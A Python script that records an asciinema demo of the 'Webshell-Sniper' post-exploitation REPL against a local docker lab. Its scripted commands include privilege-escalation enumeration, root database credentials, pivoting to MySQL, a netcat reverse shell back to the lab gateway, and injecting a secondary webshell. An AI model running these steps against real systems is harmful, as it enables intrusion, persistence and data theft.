#!/usr/bin/env python3
"""Drive the Webshell-Sniper REPL against the local docker target and emit an
asciinema v2 ``.cast`` directly (no asciinema rec, so it works headless).

The REPL is spawned on a PTY; commands are "typed" character-by-character so the
recording shows realistic input, and every byte the REPL emits is captured with
a real timestamp.  Terminal cursor-position queries (DSR) are answered so a
prompt_toolkit/readline input loop doesn't stall.
"""

from __future__ import annotations

import fcntl
import json
import os
import pty
import select
import struct
import sys
import termios
import time

WIDTH, HEIGHT = 104, 32

# (command, seconds to linger after Enter) — Metasploit-flavoured highlight reel.
# Two sessions are loaded from demo/webshells.json. NB: addresses match the docker
# compose network (172.16.1.0/24) — the host gateway (.1) the target reverse-shells
# back to, and the internal MySQL host `db`.
CMDS = [
    ("sessions", 2.0),                         # list loaded sessions (msf-style)
    ("sysinfo", 2.0),                          # alias -> recon info
    ("getuid", 1.6),                           # alias -> id (active session)
    ("cd /var/www/html", 1.4),                 # state-aware prompt (cwd)
    ("recon privesc", 2.2),                    # aggregate privesc enumeration
    # --- datastore: set once, reused as defaults (no more prompts) ---
    ("set LHOST 172.16.1.1", 0.7),
    ("set LPORT 4444", 0.7),
    ("set DB_ENGINE mysql", 0.7),
    ("set DB_HOST db", 0.7),
    ("set DB_USER root", 0.7),
    ("set DB_PASS root", 0.7),
    ("options", 2.0),                          # show the datastore
    ("download /etc/hostname", 1.8),           # alias -> file get
    ("pivot db", 2.2),                          # uses DB_* from the datastore, no prompt
    ("databases", 1.6),                        #   nested DB sub-REPL
    ("quit", 1.0),                             #   back to the main REPL
    ("sessions -c id", 2.2),                   # broadcast a command to ALL sessions
    # --- reverse shell using LHOST/LPORT from the datastore (no -i/-p needed) ---
    ("pivot shell -m bash --listen --tool nc", 3.0),
    ("id", 1.5),                               #   ...in the caught shell
    ("uname -a", 1.7),
    ("exit", 1.5),
    ("sessions -i 1", 1.4),                    # switch the active session (prompt -> [1])
    ("inject web --password s3cr3t", 2.2),     # inject a secondary webshell
    ("quit", 1.8),                             # snapshot the session
]

TYPE_DELAY = 0.05


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "demo/sniper.cast"
    argv = ["python", "-m", "webshell_sniper", "-f", "demo/webshells.json"]
    env = dict(os.environ, TERM="xterm-256color", COLUMNS=str(WIDTH), LINES=str(HEIGHT),
               COLORTERM="truecolor", FORCE_COLOR="1")

    pid, fd = pty.fork()
    if pid == 0:
        os.execvpe(argv[0], argv, env)
        os._exit(127)

    fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", HEIGHT, WIDTH, 0, 0))
    events: list[list] = []
    start = time.monotonic()

    def pump(duration: float) -> bool:
        end = time.monotonic() + duration
        while time.monotonic() < end:
            r, _, _ = select.select([fd], [], [], 0.02)
            if not r:
                continue
            try:
                data = os.read(fd, 65536)
            except OSError:
                return False
            if not data:
                return False
            # Answer cursor-position queries so the input loop never blocks.
            if b"\x1b[6n" in data:
                with contextlib_suppress():
                    os.write(fd, b"\x1b[%d;1R" % HEIGHT)
            events.append([round(time.monotonic() - start, 4), "o",
                           data.decode("utf-8", "replace")])
        return True

    pump(3.2)  # banner + connectivity check
    for cmd, linger in CMDS:
        for ch in cmd:
            os.write(fd, ch.encode())
            pump(TYPE_DELAY)
        os.write(fd, b"\r")
        pump(linger)
    pump(1.5)

    with contextlib_suppress():
        os.close(fd)
    with contextlib_suppress():
        os.waitpid(pid, 0)

    header = {"version": 2, "width": WIDTH, "height": HEIGHT,
              "timestamp": int(time.time()),
              "env": {"TERM": "xterm-256color", "SHELL": "/bin/bash"}}
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
    with open(out_path, "w") as f:
        f.write(json.dumps(header) + "\n")
        for ev in events:
            f.write(json.dumps(ev) + "\n")
    dur = events[-1][0] if events else 0.0
    print(f"wrote {out_path}: {len(events)} events, {dur:.1f}s")


class contextlib_suppress:
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return True


if __name__ == "__main__":
    main()
